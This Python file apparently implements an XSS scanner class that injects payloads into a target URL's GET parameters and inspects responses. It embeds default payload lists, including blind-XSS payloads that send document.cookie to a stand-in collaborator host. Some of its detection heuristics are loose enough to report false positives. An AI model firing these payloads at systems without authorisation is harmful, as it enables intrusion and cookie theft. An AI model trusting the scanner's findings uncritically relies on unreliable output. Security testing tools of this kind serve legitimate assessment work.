#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import urllib.parse
from typing import Any, Dict, List, Optional

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class XSSScanner:
    """
    Advanced XSS Scanner with Payload Manager Integration
    Supports: Reflected, DOM-Based, Blind, Mutation, Self-XSS, UXSS
    """

    def __init__(self, target: str, verbose: bool = False, threads: int = 10):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.threads = threads
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.vulnerable_params = []
        self.payloads_tested = 0
        self.parameters = {}

        # Load payloads from Payload Manager
        self.reflected_payloads = self._load_payloads(
            "xss", ["basic", "script", "img", "svg", "body", "input", "iframe"]
        )
        self.dom_payloads = self._load_payloads("xss", ["dom"])
        self.blind_payloads = self._load_payloads("xss", ["blind"])
        self.mutation_payloads = self._load_payloads("xss", ["mutation"])
        self.self_xss_payloads = self._load_payloads("xss", ["self"])
        self.uxss_payloads = self._load_payloads("xss", ["uxss"])

        # Fallback to default payloads if database is empty
        if not self.reflected_payloads:
            self.reflected_payloads = self._default_reflected_payloads()
        if not self.dom_payloads:
            self.dom_payloads = self._default_dom_payloads()
        if not self.blind_payloads:
            self.blind_payloads = self._default_blind_payloads()
        if not self.mutation_payloads:
            self.mutation_payloads = self._default_mutation_payloads()
        if not self.self_xss_payloads:
            self.self_xss_payloads = self._default_self_xss_payloads()
        if not self.uxss_payloads:
            self.uxss_payloads = self._default_uxss_payloads()

        # Context patterns for response analysis
        self.context_patterns = {
            "html": [r"<[^>]*>", r"&lt;[^&gt;]*&gt;"],
            "attribute": [r'["\']?[^"\'=]+=["\'][^"\']*["\']'],
            "script": [r"<script[^>]*>.*?</script>"],
            "style": [r"<style[^>]*>.*?</style>"],
            "url": [r"url\([^)]*\)", r"href=[\"'][^\"']*[\"']"],
            "json": [r"\{[^{}]*\"[^\"]*\":\"[^\"]*\"[^{}]*\}"],
        }

        self.response_patterns = {
            "alert": [r"alert\s*\([^)]*\)"],
            "document": [r"document\.(cookie|domain|URL|baseURI|referrer)"],
            "window": [r"window\.(location|name|parent|top|opener)"],
            "script": [r"<script[^>]*>.*?</script>"],
            "eval": [r"eval\s*\([^)]*\)"],
            "function": [r"new\s+Function\s*\([^)]*\)"],
            "settimeout": [r"setTimeout\s*\([^)]*\)"],
            "setinterval": [r"setInterval\s*\([^)]*\)"],
            "fetch": [r"fetch\s*\([^)]*\)"],
            "image": [r"new\s+Image\s*\([^)]*\)"],
            "location": [r"location\s*=\s*['\"][^'\"]*['\"]"],
            "documentwrite": [r"document\.write\s*\([^)]*\)"],
            "innerhtml": [r"\.innerHTML\s*=\s*['\"][^'\"]*['\"]"],
            "createelement": [r"createElement\s*\([^)]*\)"],
            "appendchild": [r"appendChild\s*\([^)]*\)"],
        }

    def _load_payloads(self, category: str, tags: List[str]) -> List[str]:
        """Load payloads from Payload Manager by category and tags"""
        payloads = []
        for tag in tags:
            results = self.payload_manager.get_payloads(category, tags=[tag], limit=100)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def _default_reflected_payloads(self) -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body/onload=alert(1)>",
            "<input/onfocus=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<math><maction actiontype=statusline# xss=alert(1)>",
        ]

    def _default_dom_payloads(self) -> List[str]:
        return [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:alert(document.domain)",
            "<svg/onload=alert(document.cookie)>",
            "';alert(document.domain)//",
        ]

    def _default_blind_payloads(self) -> List[str]:
        return [
            "<script>fetch('https://collaborator.example.com/'+document.cookie)</script>",
            "<img src=x onerror=fetch('https://collaborator.example.com/'+document.cookie)>",
            "<script>new Image().src='https://collaborator.example.com/'+document.cookie</script>",
        ]

    def _default_mutation_payloads(self) -> List[str]:
        return [
            '<noscript><p title="</noscript><script>alert(1)</script>">',
            "<!--<script>alert(1)</script>-->",
            "<![CDATA[<script>alert(1)</script>]]>",
        ]

    def _default_self_xss_payloads(self) -> List[str]:
        return [
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:text/html,<script>alert(1)</script>",
        ]

    def _default_uxss_payloads(self) -> List[str]:
        return [
            "<iframe src='about:blank' onload='alert(1)'/>",
            "<object data='javascript:alert(1)'/>",
            "<embed src='javascript:alert(1)'/>",
        ]

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def analyze_response(self, response: str, payload: str) -> Dict:
        """Analyze response for XSS indicators"""
        analysis = {
            "reflected": False,
            "encoded": False,
            "executed": False,
            "context": "unknown",
            "indicators": [],
        }
        if payload in response:
            analysis["reflected"] = True
            analysis["indicators"].append("plain_reflection")
        import html

        if html.escape(payload) in response:
            analysis["encoded"] = True
            analysis["indicators"].append("encoded_reflection")
        for pattern_name, patterns in self.response_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    analysis["executed"] = True
                    analysis["indicators"].append(pattern_name)
                    break
        for context, patterns in self.context_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE | re.DOTALL):
                    analysis["context"] = context
                    break
        return analysis

    def test_reflected(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        analysis = self.analyze_response(resp.text, payload)
        if analysis["reflected"] or analysis["encoded"]:
            result = {
                "type": "reflected",
                "param": param,
                "payload": payload,
                "url": test_url,
                "status": resp.status_code,
                "analysis": analysis,
                "content_length": len(resp.text),
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(
                f"Reflected XSS found on {param} with payload: {payload[:50]}..."
            )
            return True
        if self.verbose and analysis["executed"]:
            log_success(f"Potential XSS on {param} (execution indicators detected)")
            result = {
                "type": "potential",
                "param": param,
                "payload": payload,
                "url": test_url,
                "status": resp.status_code,
                "analysis": analysis,
            }
            self.results.append(result)
            return True
        return False

    def test_dom(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        dom_indicators = [
            "document.",
            "window.",
            "location.",
            "innerHTML",
            "outerHTML",
            "write(",
            "eval(",
            "Function(",
            "setTimeout(",
            "setInterval(",
            "createElement(",
            "appendChild(",
            "insertAdjacentHTML(",
        ]
        found_indicators = [i for i in dom_indicators if i in resp.text]
        if len(found_indicators) > 3:
            result = {
                "type": "dom_based",
                "param": param,
                "payload": payload,
                "url": test_url,
                "indicators": found_indicators,
                "status": resp.status_code,
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(
                f"DOM-Based XSS potential on {param} (indicators: {', '.join(found_indicators[:3])})"
            )
            return True
        return False

    def test_blind(self, param: str, payload: str) -> bool:
        # Blind XSS detection requires an external server to catch callbacks
        # This is a placeholder that logs the payload for manual verification
        log_info(f"Blind XSS payload sent for {param}: {payload[:50]}...")
        return False

    def test_mutation(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        mutation_indicators = [
            "<noscript",
            "<!--",
            "<![CDATA[",
            "<?xml",
            "<%",
            "<%@",
            "<%=",
            "<%$",
            "<%#",
            "<%--",
        ]
        found_indicators = [i for i in mutation_indicators if i in resp.text]
        if found_indicators:
            result = {
                "type": "mutation",
                "param": param,
                "payload": payload,
                "url": test_url,
                "indicators": found_indicators,
                "status": resp.status_code,
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(
                f"Mutation XSS potential on {param} (indicators: {', '.join(found_indicators)})"
            )
            return True
        return False

    def test_self_xss(self, param: str, payload: str) -> bool:
        log_info(f"Self-XSS payload tested on {param}: {payload[:50]}...")
        return False

    def test_uxss(self, param: str, payload: str) -> bool:
        log_info(f"UXSS payload tested on {param}: {payload[:50]}...")
        return False

    def run(self) -> Dict:
        log_info(f"Starting XSS scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning(
                "No GET parameters found. XSS scan works best with parameters like ?q=test"
            )
            return {
                "target": self.target,
                "scan_type": "xss",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0,
            }
        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        self.parameters = params
        all_payloads = (
            self.reflected_payloads
            + self.dom_payloads
            + self.blind_payloads
            + self.mutation_payloads
            + self.self_xss_payloads
            + self.uxss_payloads
        )
        random.shuffle(all_payloads)
        max_payloads = min(len(all_payloads), 500)
        for param in params.keys():
            log_info(f"Testing parameter: {param}")
            test_payloads = random.sample(
                all_payloads, min(max_payloads, len(all_payloads))
            )
            for i, payload in enumerate(test_payloads):
                if self.verbose and i % 50 == 0:
                    log_info(f"  Progress: {i}/{len(test_payloads)} payloads tested")
                if self.test_reflected(param, payload):
                    continue
                if self.test_dom(param, payload):
                    continue
                if self.test_mutation(param, payload):
                    continue
                if not any(r.get("type") == "blind" for r in self.results):
                    self.test_blind(param, payload)
                if not any(r.get("type") == "self_xss" for r in self.results):
                    self.test_self_xss(param, payload)
                if not any(r.get("type") == "uxss" for r in self.results):
                    self.test_uxss(param, payload)
        log_success(f"XSS scan completed. Found {len(self.results)} vulnerabilities.")
        log_info(f"Total payloads tested: {self.payloads_tested}")
        log_info(f"Vulnerable parameters: {len(self.vulnerable_params)}")
        reflected = [r for r in self.results if r.get("type") == "reflected"]
        dom = [r for r in self.results if r.get("type") == "dom_based"]
        mutation = [r for r in self.results if r.get("type") == "mutation"]
        return {
            "target": self.target,
            "scan_type": "xss",
            "total_params": len(params),
            "vulnerable_count": len(self.results),
            "vulnerable_params": self.vulnerable_params,
            "vulnerabilities": self.results,
            "payloads_tested": self.payloads_tested,
            "summary": {
                "reflected": len(reflected),
                "dom_based": len(dom),
                "mutation": len(mutation),
                "other": len(self.results) - len(reflected) - len(dom) - len(mutation),
            },
        }
